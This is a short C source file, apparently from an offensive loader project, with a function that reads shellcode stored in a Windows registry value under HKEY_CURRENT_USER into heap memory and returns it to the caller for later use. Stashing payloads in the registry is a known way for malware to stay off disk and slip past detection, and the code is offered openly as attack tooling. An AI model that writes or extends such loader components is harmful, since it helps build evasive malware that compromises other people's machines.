#include "glassBox.h"

BOOL ReadShellcodeFromRegistry(OUT PBYTE* ppPayload, OUT SIZE_T* psSize) {

	LSTATUS		STATUS = NULL;
	DWORD		dwBytesRead = NULL;
	PVOID		pBytes = NULL;

	// Fetching the payload size
	STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
	if (ERROR_SUCCESS != STATUS) {
		warn("RegGetValueA Failed With Error : %d\n", STATUS);
		return FALSE;
	}

	// Allocating heap that will store the payload that will be read
	pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
	if (pBytes == NULL) {
		warn("HeapALloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// Reading the payload from "REGISTRY" key, from value "REGSTRING"
	STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
	if (ERROR_SUCCESS != STATUS) {
		warn("RegGetValueA Failed With Error : %d\n", STATUS);
		return FALSE;
	}

	// saving
	*ppPayload = pBytes;
	*psSize = dwBytesRead;

	return TRUE;
}